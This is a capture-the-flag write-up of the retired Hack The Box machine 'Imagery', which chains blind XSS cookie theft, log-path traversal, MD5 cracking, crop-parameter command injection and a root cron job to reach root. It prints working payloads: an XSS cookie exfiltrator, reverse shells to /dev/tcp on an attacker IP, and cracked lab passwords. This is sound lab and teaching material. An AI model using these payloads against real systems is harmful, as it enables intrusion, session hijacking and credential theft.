---
title: "Hack The Box — Imagery"
summary: "Blind XSS steals an admin session; log traversal exposes source and test account, then image crop injection, an encrypted backup and Charcol cron lead to root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Medium"
os: "Linux"
solvedAt: 2026-11-10
publishedAt: 2026-11-10
tags:
  - blind-xss
  - session-hijacking
  - path-traversal
  - source-code-review
  - command-injection
  - password-cracking
  - sudo
  - cron
tools:
  - Nmap
  - Firefox DevTools
  - Burp Suite
  - curl
  - John the Ripper
  - Netcat
  - pyAesCrypt
cves: []
htbUrl: "https://app.hackthebox.com/machines/751"
cover: "/images/writeups/hackthebox/machines/imagery/imagery.png"
coverAlt: "Hack The Box Imagery machine logo with a glowing orange charcoal character"
featured: false
draft: false
---

> This write-up covers an authorized Hack The Box lab. An [official HTB achievement page](https://labs.hackthebox.com/achievement/machine/2040812/751) labels Imagery **RETIRED**. Flag values, session cookies, personal passwords and the author's VPN address are omitted. The credentials shown below are specific to the retired lab and needed to reproduce the path.

## Executive summary

Imagery is a Flask image gallery. A bug report renders unsanitized HTML in an administrator's browser, exposing an admin session cookie because the cookie is readable by JavaScript. The admin log download endpoint accepts directory traversal, which reveals the application source and a JSON database. A test account in that database can access an image crop function that places user input inside a shell command. Command injection provides a shell as `web`. A readable pyAesCrypt backup contains an older database with the `mark` account; `mark` can run Charcol as root through `sudo`. Charcol permits creation of a root cron job after its master password is reset.

## Target information

| Item | Value |
| --- | --- |
| Target | Imagery |
| Platform | Hack The Box |
| Difficulty | Medium |
| Operating system | Linux |
| Machine ID | [751](https://app.hackthebox.com/machines/751) |
| Publication policy | Retired, confirmed by [Hack The Box](https://labs.hackthebox.com/achievement/machine/2040812/751) |
| Main weaknesses | Blind XSS, path traversal, command injection, weak lab passwords, privileged cron creation |

HTB assigns an instance address for each session. Set these variables to the addresses shown in your own lab and VPN connection. The examples below use the variables rather than a previous player's addresses.

```bash
export TARGET_IP='<YOUR_HTB_TARGET_IP>'
export ATTACKER_IP='<YOUR_HTB_VPN_IP>'
export BASE="http://${TARGET_IP}:8000"
```

## Enumeration

I scanned every TCP port and ran Nmap's default scripts and service detection:

```bash
nmap "$TARGET_IP" -sC -sV -p-
```

Only two ports were open:

```text
22/tcp    open  ssh   OpenSSH 9.7p1 Ubuntu 7ubuntu4.3
8000/tcp  open  http  Werkzeug 3.1.3 (Python 3.12.7)
```

The web service displayed an image gallery with registration, login, upload and a **Report Bug** form in the footer. I registered a normal account and confirmed that an ordinary user could upload an image. SSH did not yet offer a useful route because no system credentials were available.

### Findings

| Evidence | Why it mattered |
| --- | --- |
| Werkzeug on port 8000 | Suggested a Python web app; later source files confirmed Flask. |
| Bug reports were reviewed by an admin | A stored payload could execute in a more privileged browser session. |
| Admin panel included log downloads | A filename parameter became a candidate for path traversal. |
| Image upload accepted JPEG and PNG | A valid image was needed before the transform endpoint would run. |

## Initial access

### Blind XSS in Report Bug

I started an HTTP listener on my Kali machine:

```bash
python3 -m http.server 9000
```

In the **Report Bug** description field, I submitted an image element with an invalid source. Its `onerror` handler sends the browser cookie to my listener:

```html
<img src=x onerror="new Image().src='http://<YOUR_HTB_VPN_IP>:9000/?c='+encodeURIComponent(document.cookie)">
```

Replace the placeholder in the HTML with your actual VPN IP; the shell variable is not expanded in a browser form. The callback arrived from the target after the administrator bot opened the report:

```text
GET /?c=session%3D<REDACTED_ADMIN_SESSION> HTTP/1.1
```

`%3D` decodes to `=`. I URL-decoded the query value, extracted only the value after `session=`, and replaced my browser's `session` cookie for the gallery origin in **Firefox DevTools → Storage → Cookies**. Refreshing the page exposed the admin interface. Do not put `session=` inside the cookie value a second time.

### Arbitrary file read in the admin log download

The admin panel's log download sent a request to `/admin/get_system_log` with a `log_identifier` parameter. Replacing a log filename with `../db.json` returned the application database:

```bash
export ADMIN_SESSION='<ADMIN_SESSION_VALUE_ONLY>'

curl -sG -b "session=$ADMIN_SESSION" \
  --data-urlencode 'log_identifier=../db.json' \
  "$BASE/admin/get_system_log" -o db.json

head -c 500 db.json
```

The response began with a JSON `users` array, confirming that the endpoint read files outside its intended log directory. The same technique retrieved the application code. `/proc/self/cwd` points to the running process's working directory, avoiding a guess about the install path:

```bash
curl -sG -b "session=$ADMIN_SESSION" \
  --data-urlencode 'log_identifier=../../../../../proc/self/cwd/api_edit.py' \
  "$BASE/admin/get_system_log" -o api_edit.py

rg -n 'apply_visual_transform|shell=True|is_testuser_account' api_edit.py
```

In `api_edit.py`, `/apply_visual_transform` required the session flag `is_testuser_account`. For a `crop`, it placed the user-controlled `x`, `y`, `width` and `height` values into an ImageMagick command string, then passed that string to `subprocess.run(..., shell=True)`. The shell interpretation of a crop coordinate was the command injection boundary. Other transform types used argument arrays and were not needed for this path.

### Obtain the test account

The live `db.json` contained `testuser@imagery.htb` with `isTestuser: true` and an unsalted MD5 password hash:

```text
2c65c8d7bfbca32a3ed42596192384f6
```

I cracked it locally with John the Ripper:

```bash
printf '%s\n' '2c65c8d7bfbca32a3ed42596192384f6' > testuser.md5
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt testuser.md5
john --show --format=raw-md5 testuser.md5
```

The result was `iambatman`. I logged out of the admin session and logged in to the web app with **email** `testuser@imagery.htb` and **password** `iambatman`.

### Crop command injection and a `web` shell

As the test account, I uploaded an ordinary JPEG. The optional **Group** field only organizes images; choosing a group named *Transformed* does not perform a transformation. In **Gallery**, the image card's three-dot menu offered **Transform Image → Crop**.

I opened a listener on Kali:

```bash
nc -lvnp 9001
```

Burp Suite intercepted `POST /apply_visual_transform`. The request contained an `imageId` for my uploaded image. I kept that ID and changed only `params.x` from a number to a string:

```json
{
  "imageId": "<YOUR_UPLOADED_IMAGE_ID>",
  "transformType": "crop",
  "params": {
    "x": "0; bash -c 'bash -i >& /dev/tcp/<YOUR_HTB_VPN_IP>/9001 0>&1' #",
    "y": 0,
    "width": 4608,
    "height": 2592
  }
}
```

Replace the VPN IP placeholder before sending. The semicolon ends the ImageMagick command, and `#` comments out the rest of the constructed shell line. The image ID must belong to the logged-in test account; another user's image will fail the ownership check. Burp updates `Content-Length` when it sends the modified JSON. The HTTP response may remain pending while the reverse shell is connected.

```text
connect to [<YOUR_HTB_VPN_IP>] from [<TARGET_IP>]
web@Imagery:~/web$
```

I confirmed the initial shell with `id`. To make password prompts usable later, I allocated a pseudo-terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege escalation

### Recover `mark` from an encrypted backup

Local enumeration as `web` found a readable backup:

```bash
ls -lh /var/backup/
# web_20250806_120723.zip.aes, approximately 22 MB
```

I transferred it to Kali over a separate connection. Start the receiving listener on Kali first, then run the sender in the `web` shell. In a basic reverse shell, paste one command at a time and wait for its prompt; several pasted lines can merge.

```bash
# Kali
nc -lvnp 9002 > web_20250806_120723.zip.aes
```

```bash
# Target, as web
nc <YOUR_HTB_VPN_IP> 9002 < /var/backup/web_20250806_120723.zip.aes
```

Compare `sha256sum` on both copies to check the transfer. `file` identifies the backup as AES encrypted data made by pyAesCrypt. A wordlist attack against this retired lab backup yields `bestfriends`. With that lab password, decryption is straightforward:

```bash
python3 -m venv venv
source venv/bin/activate
pip install pyAesCrypt

python3 - <<'PY'
import pyAesCrypt

pyAesCrypt.decryptFile(
    'web_20250806_120723.zip.aes',
    'web_backup.zip',
    'bestfriends',
    64 * 1024,
)
PY

unzip web_backup.zip -d extracted
cat extracted/web/db.json
```

The older database included `mark@imagery.htb`, which was absent from the current database. Its password hash was `01c3d2e5bdaf6134cec0a367cf53e535`. I checked it with the same raw MD5 format and wordlist:

```bash
printf '%s\n' '01c3d2e5bdaf6134cec0a367cf53e535' > mark.md5
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt mark.md5
john --show --format=raw-md5 mark.md5
```

The resulting password was `supersmash`. In the target shell:

```bash
su mark
# Enter the recovered mark password
id
cat /home/mark/user.txt
sudo -l
```

The `sudo -l` output showed the trust boundary that leads to root:

```text
User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

### Reset Charcol and create a root cron job

Charcol is a custom backup utility. It was already configured with a master passphrase, but its `-R` option permits a reset after verifying the invoking user's **system password**. Running it through the allowed `sudo` rule resets the root-owned Charcol configuration:

```bash
sudo /usr/local/bin/charcol -R
# Confirm with mark's system password when prompted.

sudo /usr/local/bin/charcol shell
```

At the first-time setup prompt, I pressed **Enter** to select *no password mode* and answered `yes`. Charcol saved the choice and requested a restart, so I exited and launched its shell again:

```bash
sudo /usr/local/bin/charcol shell
```

Before scheduling the job, I opened another Kali listener:

```bash
nc -lvnp 9003
```

Inside `charcol>`, I added a job that runs every minute. Replace the VPN IP placeholder before submitting:

```text
auto add --schedule "* * * * *" --command "/bin/bash -c '/bin/bash -i >& /dev/tcp/<YOUR_HTB_VPN_IP>/9003 0>&1'" --name "imagery-root"
```

Charcol requested `mark`'s system password again and reported that the cron line was added. Because Charcol was running through `sudo`, the scheduled command ran with root privileges. At the next minute boundary, the listener could receive a root shell:

```bash
id
# uid=0(root) gid=0(root) ...
cat /root/root.txt
```

The flag value is intentionally omitted. After verifying access, remove the recurring job from the Charcol shell:

```text
auto list
auto delete <JOB_ID_FROM_AUTO_LIST>
```

## What did not work

- Trying `iambatman@imagery.htb` as the login email failed: `iambatman` was the cracked **password** for `testuser@imagery.htb`.
- Selecting the *Transformed* upload group did not run an image transform. The crop action was in the uploaded image's three-dot menu.
- Pasting several commands into the first `web` reverse shell merged their text. Issuing one command per prompt fixed the backup-transfer step.
- An incomplete attempt to set a new Charcol application password failed because the master passphrase was empty. Returning to the setup prompt and explicitly choosing *no password mode* completed setup.

## Attack path

1. Enumerate SSH and the Flask gallery on port 8000.
2. Register and submit a blind XSS payload through **Report Bug** to obtain the admin session.
3. Use `log_identifier` traversal to read `db.json` and `api_edit.py`.
4. Crack the test account's MD5 hash, upload an image, and inject a command into the crop coordinate.
5. Use the `web` shell to recover and decrypt a backup containing `mark`'s credentials.
6. Switch to `mark`, reset root-run Charcol, and schedule a cron command to obtain root execution.

## Lessons learned

- An admin-only feature is reachable through a lower-privileged browser when stored XSS and JavaScript-readable session cookies coexist. Encode output and use `HttpOnly` cookies.
- File download parameters must be resolved and checked against an allowed directory. A log filename became an arbitrary file read and exposed the code path for the next stage.
- Avoid shell command strings for image tools. Pass a fixed argument list and validate numeric crop coordinates before invoking ImageMagick.
- An encrypted backup is only as strong as its passphrase and access controls. The old database revealed a system user's reusable password.
- A `sudo` allowlist entry for a general-purpose application can still grant root when that application schedules arbitrary commands. Restrict privileged functions and the commands they accept.

## References

- [Hack The Box Imagery machine](https://app.hackthebox.com/machines/751)
- [Official Hack The Box retired-state evidence](https://labs.hackthebox.com/achievement/machine/2040812/751)
- [Hack The Box publication guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
